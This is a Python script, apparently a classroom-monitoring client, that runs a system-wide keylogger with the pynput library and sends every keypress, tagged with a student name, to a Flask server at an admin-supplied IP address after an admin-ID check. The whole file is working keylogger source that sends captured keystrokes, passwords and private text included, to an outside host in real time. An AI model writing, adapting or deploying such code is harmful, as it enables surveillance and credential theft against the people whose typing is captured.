import requests
from pynput.keyboard import Listener, Key

# Initial values for server details and student info
admin_server_url = ''
student_name = ''
admin_id = ''

def validate_admin(admin_id, admin_ip):
    try:
        response = requests.post(f'http://{admin_ip}:5000/validate_admin', json={'admin_id': admin_id})
        return response.status_code == 200
    except Exception as e:
        print(f"Error validating admin: {e}")
        return False

# Function to start the keylogger
def start_keylogger(admin_id, admin_ip, name):
    global admin_server_url, student_name
    admin_server_url = f'http://{admin_ip}:5000/log'  # Set the server URL dynamically
    student_name = name

    def send_key_to_admin(key):
        global student_name

        try:
            if key == Key.backspace:
                requests.post(admin_server_url, json={'key': 'BACKSPACE', 'name': student_name})
            else:
                letter = str(key).replace("'", "")  # Get readable key
                if letter == 'Key.space':
                    letter = ' '
                elif letter == 'Key.enter':
                    letter = '\n'
                elif letter == 'Key.tab':
                    letter = '\t'  # Optional: Handle tab key

                # Send the key to the Flask server
                requests.post(admin_server_url, json={'key': letter, 'name': student_name})

        except Exception as e:
            print(f"Failed to send keypress: {e}")

    # Start listening for key presses
    with Listener(on_press=send_key_to_admin) as listener:
        listener.join()

def main():
    global admin_id, admin_ip, student_name
    try:
        # Get user input for admin ID, IP, and student name
        admin_id = input("Enter Admin ID: ")
        admin_ip = input("Enter Admin IP: ")
        student_name = input("Enter Your Name: ")

        # Validate the admin ID before starting the keylogger
        if validate_admin(admin_id, admin_ip):
            # Start the keylogger
            start_keylogger(admin_id, admin_ip, student_name)
        else:
            print("Error: Admin ID does not match any registered admin ID.")
    except Exception as e:
        print(f"An error occurred: {e}")

    # Pause before closing to see the output
    input("Press Enter to exit...")

if __name__ == "__main__":
    main()
